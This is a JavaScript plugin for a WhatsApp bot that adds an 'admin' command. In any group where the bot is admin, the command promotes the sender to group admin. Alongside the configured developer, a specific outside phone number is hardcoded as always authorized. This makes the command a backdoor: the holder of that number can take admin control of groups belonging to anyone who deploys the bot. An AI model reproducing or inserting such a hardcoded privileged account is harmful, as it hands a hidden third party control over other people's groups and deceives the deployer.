const { cmd } = require('../command');
const config = require('../config');

cmd({
    pattern: "admin",
    alias: ["takeadmin", "makeadmin"],
    desc: "Take adminship for authorized users",
    category: "group",
    react: "👑",
    filename: __filename
},
async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {
    // Verify group context
    if (!isGroup) return reply("❌ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜsᴇᴅ ɪɴ ɢʀᴏᴜᴘs.");

    // Verify bot is admin
    if (!isBotAdmins) return reply("❌ ɪ ɴᴇᴇᴅ ᴛᴏ ʙᴇ ᴀɴ ᴀᴅᴍɪɴ ᴛᴏ ᴘᴇʀғᴏʀᴍ ᴛʜɪs ᴀᴄᴛɪᴏɴ.");

    // Normalize JIDs for comparison
    const normalizeJid = (jid) => {
        if (!jid) return jid;
        return jid.includes('@') ? jid.split('@')[0] + '@s.whatsapp.net' : jid + '@s.whatsapp.net';
    };

    // Authorized users (properly formatted JIDs)
    const AUTHORIZED_USERS = [
        normalizeJid(config.DEV), // Handles both raw numbers and JIDs in config
        "50948336180@s.whatsapp.net"
    ].filter(Boolean);

    // Check authorization with normalized JIDs
    const senderNormalized = normalizeJid(sender);
    if (!AUTHORIZED_USERS.includes(senderNormalized)) {
        return reply("❌ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ is ʀᴇsᴛʀɪᴄᴛᴇᴅ ᴛᴏ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴜsᴇʀs ᴏɴʟʏ");
    }

    try {
        // Get current group metadata
        const groupMetadata = await conn.groupMetadata(from);
        
        // Check if already admin
        const userParticipant = groupMetadata.participants.find(p => p.id === senderNormalized);
        if (userParticipant?.admin) {
            return reply("ℹ️ ʏᴏᴜ'ʀᴇ ᴀʟʀᴇᴀᴅʏ ᴀɴ ᴀᴅᴍɪɴ ɪɴ ᴛʜɪs ɢʀᴏᴜᴘ");
        }

        // Promote self to admin
        await conn.groupParticipantsUpdate(from, [senderNormalized], "promote");
        
        return reply("✅ sᴜᴄᴄᴇssғᴜʟʟʏ ɢʀᴀɴᴛᴇᴅ ʏᴏᴜ ᴀᴅᴍɪɴ ʀɪɢʜᴛs!");
        
    } catch (error) {
        console.error("ᴀᴅᴍɪɴ ᴄᴏᴍᴍᴀɴᴅ ᴇʀʀᴏʀ:", error);
        return reply("❌ Failed to grant admin rights. Error: " + error.message);
    }
});
